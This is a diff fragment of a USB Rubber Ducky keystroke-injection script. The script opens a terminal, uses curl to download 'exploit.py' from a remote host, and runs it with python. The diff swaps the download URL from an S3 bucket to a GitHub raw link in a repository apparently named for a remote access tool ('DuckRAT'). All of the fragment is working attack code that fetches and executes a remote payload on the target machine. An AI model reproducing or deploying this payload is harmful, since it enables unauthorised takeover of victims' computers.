@@ -7,7 +7,7 @@ DELAY 1000
 STRING TERMINAL
 ENTER
 DELAY 1000
-STRING curl https://s3-us-west-2.amazonaws.com/remoteduck/exploit.py -o exploit.py
+STRING curl https://github.com/stbernardy/RemoteDuck/raw/master/DuckRAT/exploit.py -o exploit.py
 ENTER
 DELAY 1000
 STRING python exploit.py
